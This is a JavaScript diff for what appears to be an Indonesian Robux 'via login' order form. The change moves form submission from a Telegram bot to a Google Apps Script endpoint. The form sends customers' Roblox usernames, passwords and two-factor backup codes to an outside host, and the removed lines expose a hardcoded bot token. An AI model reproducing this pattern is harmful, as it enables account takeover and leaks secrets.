@@ -265,7 +265,7 @@ document.getElementById("metodeV2L").addEventListener("change", function() {
   }
 });
 
-// Kirim via Telegram
+// Kirim via Telegram melalui Apps Script
 document.getElementById("btnWa").addEventListener("click", function() {
   const form = document.getElementById("orderForm");
   const inputs = form.querySelectorAll("input[required], select[required]");
@@ -288,29 +288,22 @@ document.getElementById("btnWa").addEventListener("click", function() {
   let nominal = document.getElementById("nominal").value;
   let harga = document.getElementById("harga").value;
 
-  let pesan = `📋 *Order Robux VILOG* 📋\n\n` +
-              `👤 Seller: ${seller}\n` +
-              `Nama: ${nama}\n` +
-              `Username: ${username}\n` +
-              `Password: ${password}\n` +
-              `V2L: ${v2l}\n` +
-              (v2l === "ON" ? `➡️ Metode V2L: ${metodeV2L}\n` : "") +
-              (metodeV2L === "Backup Code" ? `🔐 Backup Code: ${backupCode}\n` : "") +
-              `Kategori: ${kategori}\n` +
-              `Nominal: ${nominal}\n` +
-              `Harga: ${harga}`;
+  let url = "https://script.google.com/macros/s/AKfycbyxD2OphmaH3aI7QifNvAh5CXDavbdl5_qO0IVplpWwByt9wwoTga_btnTofXz1zaF9xA/exec";
 
-  let token = "8039852277:AAEqbfQUF37cjDlEposj2rzHm28_Pxzv-mw";
-  let chat_id = "4935292911";
-  let url = `https://api.telegram.org/bot${token}/sendMessage`;
-  
   fetch(url, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      chat_id: chat_id,
-      text: pesan,
-      parse_mode: "Markdown"
+      seller,
+      nama,
+      username,
+      password,
+      v2l,
+      metodeV2L,
+      backupCode,
+      kategori,
+      nominal,
+      harga
     })
   })
   .then(response => {
